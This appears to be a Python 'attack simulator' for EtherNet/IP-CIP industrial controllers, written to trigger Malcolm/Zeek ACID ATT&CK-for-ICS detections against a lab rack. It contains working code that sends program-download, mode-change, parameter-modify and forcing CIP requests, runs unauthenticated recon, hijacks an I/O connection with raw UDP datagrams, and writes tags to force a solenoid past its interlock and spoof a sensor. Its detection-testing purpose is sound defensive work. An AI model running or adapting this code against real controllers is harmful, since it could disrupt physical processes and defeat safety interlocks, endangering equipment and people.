"""EtherNet/IP-CIP ICS attack simulator — triggers Malcolm ACID ATT&CK for ICS
detections for CIP (`ACID_cip_detect.zeek`).

Unlike BACnet's ACID table (matched by literal service *name*), CIP's table is
matched by raw Class/Service *byte pairs* (from `mDOTS_config_change`):

    Handshake  Class 0x8e Service 0x5c
    T0836      Class 0x6a Service 0x51
    T0843      Class 0xac Service 0x08
    T0858      Class 0x8e Service 0x06 or 0x07
    Forcing    Class 0x68 Service 0x4d, or Class 0x69 Service 0x4e

None of these are tags this simulator's rack (Sensor1/Solenoid1) actually
exposes — `enip_server.py`'s object model has no idea what Class 0x8e/0x6a/
/0xac/0x68/0x69 are. That's fine and expected: ACID is a passive Zeek
analyzer watching the Class/Service byte pair on the wire, not whether the
target understood or accepted the request.

**Confirmed live 2026-07-04 against a real Malcolm deployment: all 7
requests fire in ACID.** 4 get a real, correctly-mapped `threat.technique.id`
(T0836, T0843, T0858 x2 — both byte-pair variants); the other 3 (Handshake,
Forcing x2) get a real, correctly-mapped tactic-only match with no numbered
technique ID (`Privilege_Escalation`/`Impair_Process` — Handshake and Forcing
aren't officially-numbered MITRE techniques, same as S7comm's Handshake).
This took two rounds to get right — see the CRITICAL note below; the first
live attempt got 0 of 7 despite every request encoding "correctly" by the
(wrong) measure available before deployment.

Two different cpppo APIs are needed to reach these pairs, not one:

  - `client.connector.process()` with a generic `service_code` operation
    reaches Handshake/T0836/T0843/T0858/Forcing-0x69 directly — cpppo's own
    client encoder treats an arbitrary (code, path) pair as a bare,
    payload-free CIP request with no special handling.
  - Forcing's OTHER row (Class 0x68 Service 0x4d) can NOT go through that
    same generic path — confirmed by direct testing: cpppo's own Logix
    dialect encoder (`cpppo/server/enip/logix.py`) special-cases service
    0x4d as "this must be a Write Tag request" and unconditionally reaches
    for a `write_tag` payload structure that a bare service-code call never
    populates, raising an `AttributeError` before a single byte reaches the
    socket. The fix is to go through cpppo's own `connector.write()` method
    instead (which builds that `write_tag` structure correctly) pointed at
    Class 0x68 Instance 1 in place of a real tag name — cpppo doesn't care
    that "0x68/1" isn't a symbolic tag, and the resulting wire bytes are the
    same Class 0x68 Service 0x4d CIP request ACID's table wants, just with a
    real (dummy) data payload attached instead of none.

CRITICAL: both `service_code()` and `write()` must be called with
`route_path=False, send_path=False`. Confirmed live 2026-07-04 against a real
Malcolm deployment: without these, cpppo's `connector.req_send()` ->
`unconnected_send()` unconditionally wraps EVERY outgoing request in an
outer "Unconnected Send" envelope (Service 0x52, Class 0x06 Connection
Manager) by default -- `unconnected_send()`'s own docstring calls this the
"default route_path ... CPU in chassis" behavior, meant for routed/backplane
access to a real ControlLogix rack. That wrapper becomes the TOP-LEVEL CIP
service Zeek parses and logs (`zeek.cip.class_id: "0x06"`, `cip_service_code:
"0x52"`) -- our intended Class/Service pair ends up nested one layer deeper,
inside the Unconnected Send's own embedded-request field, which Zeek's CIP
analyzer does not unpack into a second, separately-matchable event. Result:
0 of 7 requests ever matched ACID's table on the first live-deployment pass,
despite every one of them encoding "correctly" by the (wrong) measure used
during local pre-deployment testing (inspecting `request.input.hex()`, which
only shows the PRE-wrap embedded payload, not the final wire bytes). Passing
`route_path=False, send_path=False` matches this library's own documented
escape hatch ("for simple non-routing CIP devices ... just go straight to
the command payload") and confirmed via a local server-side parse trace: the
outer Service-0x52/Class-6 wrapper disappears entirely and our Class/Service
pair becomes the actual top-level request. `enip_client.py`'s normal tag
polling is deliberately NOT changed to match -- it isn't one of ACID's
trigger rows either way, so being wrapped in Unconnected Send is harmless
there (and arguably more realistic, since some real EtherNet/IP masters do
route tag access through Connection Manager).

Every fire()/fire_write() call opens its own fresh connection — a malformed
encapsulation-level reply from this simulator's minimal object model can
leave a session unusable for follow-up requests on the same connection
(confirmed by direct testing), so isolating each attempt avoids one hiccup
cascading into every technique after it.

Also populates two of Malcolm's own built-in (not ACID) CIP dashboard panels
that nothing else here ever touches:

  - "CIP - Device Identity" / "CIP - Identity Logs" (Zeek's cip_identity.log):
    needs a real ENIP "List Identity" command (0x63) -- see list_identity().
  - "CIP - IO Logs" (Zeek's cip_io.log): needs real Connected I/O ("Implicit
    Messaging", Class 0/1) datagrams -- see send_cip_io()/io_hijack(). cpppo
    has NO support for this at all (confirmed: no Sequenced Address Item or
    port-2222 handling anywhere in its source, unlike everything else in this
    script which builds on cpppo's own request-encoding) -- the wire format is
    hand-built directly from the CIP spec instead: a bare CPF (Common Packet
    Format) structure with a Sequenced Address Item (type 0x8002: connection
    ID + rolling sequence number) and a Connected Data Item (type 0x00b1:
    a second, application-level sequence count + payload), sent as a raw UDP
    datagram to port 2222 with NO EtherNet/IP encapsulation header at all --
    that header only exists for TCP explicit-messaging traffic. Confirmed
    live 2026-07-04 that a real Forward Open (Class 3, over TCP, via cpppo's
    `client.implicit`) followed by these hand-built datagrams populates a
    genuine `zeek.cip_io` record with real `connection_id`/`sequence_number`/
    `io_data` fields -- a real Class 3 connected *explicit* exchange over the
    SAME TCP session (`connected_send()`) does NOT get logged as cip_io, only
    true UDP:2222 Connected I/O does.

Usage:
    python3 enip_attack.py --target 192.168.40.10
"""

from __future__ import annotations

import argparse
import logging
import socket
import struct

from cpppo.server.enip import client, parser

log = logging.getLogger("enip_attack")

TAG_SENSOR = "Sensor1"
TAG_SOLENOID = "Solenoid1"


def fire(host: str, port: int, label: str, code: int, path: str) -> None:
    """Send one raw CIP service-code request and log however the device
    responds. A malformed/garbled reply is expected and fine here — see
    module docstring. route_path/send_path=False is REQUIRED -- see module
    docstring's "CRITICAL" note for why (without it, this ends up nested
    inside an Unconnected Send envelope and never reaches ACID at all)."""
    try:
        with client.connector(host=host, port=port, timeout=5.0) as conn:
            ops = [{
                "method": "service_code", "code": code, "path": path,
                "route_path": False, "send_path": False,
            }]
            failures, _transactions = conn.process(
                operations=ops, depth=1, multiple=0, fragment=False, printing=False
            )
            log.info("%s: sent (failures=%d)", label, failures)
    except Exception as exc:  # noqa: BLE001 — garbled replies expected, see docstring
        log.info("%s: sent, device responded %s: %s", label, type(exc).__name__, exc)


def fire_write(host: str, port: int, label: str, path: str) -> None:
    """Same as fire(), but for the one Forcing trigger (Class 0x68 Service
    0x4d) that must go through cpppo's own write() method — see module
    docstring for why the generic service-code path can't reach it."""
    try:
        with client.connector(host=host, port=port, timeout=5.0) as conn:
            conn.write(
                path=path, data=[0], elements=1, tag_type=parser.SINT.tag_type, offset=None,
                route_path=False, send_path=False, timeout=5.0,
            )
            data, _elapsed = client.await_response(conn, timeout=5.0)
            log.info("%s: sent, response enip.status=%s", label, data.get("enip", {}).get("status"))
    except Exception as exc:  # noqa: BLE001 — garbled replies expected, see docstring
        log.info("%s: sent, device responded %s: %s", label, type(exc).__name__, exc)


def _read(conn: client.connector, tag: str) -> bool:
    ops = client.parse_operations([tag])
    failures, transactions = conn.process(operations=ops, depth=1, multiple=0, fragment=False, printing=False)
    if failures:
        raise RuntimeError(f"read {tag} failed")
    return bool(transactions[0][0])


def _write(conn: client.connector, tag: str, value: bool) -> bool:
    ops = client.parse_operations([f"{tag}=(BOOL){1 if value else 0}"])
    failures, _transactions = conn.process(operations=ops, depth=1, multiple=0, fragment=False, printing=False)
    return failures == 0


def list_identity(host: str, port: int) -> None:
    """T0846-style device-identification recon via the ENIP "List Identity"
    command (command 0x63) -- a bare encapsulation-level request, not a CIP
    explicit message, so it never touches the Unconnected-Send wrapping issue
    documented above. Populates Malcolm's "CIP - Device Identity" /
    "CIP - Identity Logs" dashboard panels (Zeek's separate cip_identity.log),
    which nothing else in this script or enip_client.py's normal polling ever
    generates -- ordinary tag access and raw CIP requests never produce a
    cip_identity.log entry.

    MUST be sent over UDP, not TCP -- confirmed live 2026-07-04: the identical
    request over a normal TCP session gets a real, correctly-formed response
    from the target (application-layer round-trip genuinely works) but Zeek
    never logs it as cip_identity at all. List Identity is conventionally a
    UDP broadcast-discovery command (real EtherNet/IP scanners send it to
    255.255.255.255:44818 with no prior session) -- switching to
    `client.connector(..., udp=True)` (skips Register Session entirely,
    matching that convention) is what actually produces a real
    `event.dataset: cip_identity` entry. cpppo's UDP client mode requires
    using it as a context manager (`with client.connector(...)`) -- calling
    methods on it directly without `with` hits an internal
    "attempted to enter a cpppo.enip_machine w/o locking" assertion.

    Confirmed live 2026-07-04 against a local enip_server.py: cpppo's default
    Identity Object answers with real (if generic, cpppo-default) product
    data -- product_name '1756-L61/B LOGIX5561', vendor_id 1, device_type 14
    (Programmable Logic Controller)."""
    try:
        with client.connector(host=host, port=port, udp=True, timeout=5.0) as conn:
            conn.list_identity(timeout=5.0)
            data, _elapsed = client.await_response(conn, timeout=5.0)
            identity = data.get("enip", {}).get("CIP", {}).get("list_identity", {})
            log.info("[recon] List Identity (UDP): %s", identity or "no identity data returned")
    except Exception as exc:  # noqa: BLE001 — a real device might not implement this
        log.info("[recon] List Identity (UDP): sent, device responded %s: %s", type(exc).__name__, exc)


CIP_IO_PORT = 2222


def send_cip_io(host: str, connection_id: int, sequence: int, seq_count: int, payload: bytes) -> None:
    """Send one raw CIP Connected I/O datagram directly to UDP port 2222 --
    see module docstring for why this is hand-built rather than going
    through cpppo. No EtherNet/IP encapsulation header; the datagram IS the
    bare CPF structure."""
    item1 = struct.pack("<HH", 0x8002, 8) + struct.pack("<II", connection_id, sequence)
    item2 = struct.pack("<HH", 0x00B1, 2 + len(payload)) + struct.pack("<H", seq_count) + payload
    datagram = struct.pack("<H", 2) + item1 + item2
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(datagram, (host, CIP_IO_PORT))
    finally:
        sock.close()


def io_hijack(host: str, port: int) -> None:
    """Establish a real Forward Open (Class 3 connected session over TCP,
    via cpppo's client.implicit), then send a handful of raw Connected I/O
    datagrams using that connection's real O_T connection ID -- an
    "unauthorized I/O connection" demo: a real device would never expect an
    engineering workstation's TCP explicit-messaging session to also be used
    to establish a live I/O connection to a rack it has no HMI/SCADA
    relationship with. See module docstring for why this needs the raw
    UDP:2222 datagram path (send_cip_io) rather than cpppo's own
    connected_send(), which stays on the TCP session and never produces a
    cip_io.log entry."""
    try:
        conn = client.implicit(host=host, port=port, timeout=5.0)
        connection_id = conn.established.forward_open.O_T.connection_ID
        log.info("[io] Forward Open established, O_T connection_ID=0x%08x", connection_id)
        for i in range(1, 6):
            payload = struct.pack("<BB", 1, 0)  # fake Sensor1/Solenoid1-shaped I/O payload
            send_cip_io(host, connection_id, sequence=i, seq_count=i, payload=payload)
        log.info("[io] sent 5 raw Connected I/O datagrams to UDP:%d", CIP_IO_PORT)
        conn.close()
    except Exception as exc:  # noqa: BLE001 — a real device might reject the Forward Open
        log.info("[io] Forward Open / I/O send failed: %s: %s", type(exc).__name__, exc)


def recon_and_force(host: str, port: int) -> None:
    """T0846-style unauthenticated recon, plus forcing the solenoid against
    its own interlock and spoofing the sensor reading -- real protocol-level
    demo value even though none of these three map onto ACID's CIP table
    (that table's rows are vendor/engineering-access services, not ordinary
    tag reads/writes)."""
    with client.connector(host=host, port=port, timeout=5.0) as conn:
        sensor = _read(conn, TAG_SENSOR)
        solenoid = _read(conn, TAG_SOLENOID)
        log.info("[recon] unauthenticated tag dump: Sensor1=%s Solenoid1=%s (no credentials required)", sensor, solenoid)

        forced = not sensor
        log.info("[force] forcing Solenoid1=%s while Sensor1=%s — ignoring the interlock entirely", forced, sensor)
        ok = _write(conn, TAG_SOLENOID, forced)
        log.info("[force] write result: %s", "SUCCESS" if ok else "FAILED")

        fake = not sensor
        log.info("[spoof] real Sensor1=%s — spoofing it to %s", sensor, fake)
        ok = _write(conn, TAG_SENSOR, fake)
        log.info("[spoof] write result: %s", "SUCCESS" if ok else "FAILED")


def attack(host: str, port: int) -> None:
    list_identity(host, port)
    io_hijack(host, port)
    recon_and_force(host, port)

    fire(host, port, "[Handshake] Class 0x8e Service 0x5c", 0x5C, "@0x8e/1")
    fire(host, port, "[T0836 Modify Parameter] Class 0x6a Service 0x51", 0x51, "@0x6a/1")
    fire(host, port, "[T0843 Program Download] Class 0xac Service 0x08", 0x08, "@0xac/1")
    fire(host, port, "[T0858 Change Operating Mode] Class 0x8e Service 0x06", 0x06, "@0x8e/1")
    fire(host, port, "[T0858 Change Operating Mode] Class 0x8e Service 0x07", 0x07, "@0x8e/1")
    fire_write(host, port, "[Forcing] Class 0x68 Service 0x4d", "@0x68/1")
    fire(host, port, "[Forcing] Class 0x69 Service 0x4e", 0x4E, "@0x69/1")

    log.info("Attack sequence complete.")


def main() -> None:
    parser_ = argparse.ArgumentParser(description="EtherNet/IP-CIP ACID/ATT&CK ICS attack simulator")
    parser_.add_argument("--target", required=True, help="EtherNet/IP-CIP field device IP (e.g. 192.168.40.10)")
    parser_.add_argument("--port", type=int, default=44818)
    args = parser_.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    for noisy in ("cpppo", "enip", "network"):  # cpppo dumps full CIP packet traces at INFO
        logging.getLogger(noisy).setLevel(logging.WARNING)
    attack(args.target, args.port)


if __name__ == "__main__":
    main()
